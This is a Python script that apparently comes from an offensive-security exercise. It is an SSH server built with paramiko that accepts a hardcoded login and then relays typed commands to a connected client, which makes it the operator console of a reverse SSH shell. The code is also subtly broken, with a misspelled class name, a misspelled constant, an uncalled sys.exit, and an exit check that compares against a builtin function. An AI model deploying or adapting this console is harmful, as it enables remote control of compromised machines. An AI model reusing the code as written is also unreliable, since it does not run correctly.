import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAkey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind: str, chanid: int):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRAIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = '127.0.0.1'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection...')
        client, addr = sock.accept()
    except Exception as e:
        print ('[-] Listen failed: ' + str(e))
        sys.exit
    else:
        print('[+] Got a connection!', client, addr)
    
    bhsession = paramiko.Transport(client)
    bhsession.add_server_key(HOSTKEY)
    server = Server()
    bhsession.start_server(server=server)

    chan =bhsession.accept(20)
    if chan is None:
        print('*** No Channel.')
        sys.exit(1)
    
    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcom to blackHat ssh')
    try:
        while True:
            command = input('Enter Command: ')
            if command != exit:
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('Exiting')
                bhsession.close()
                break
    except KeyboardInterrupt:
        bhsession.close()
        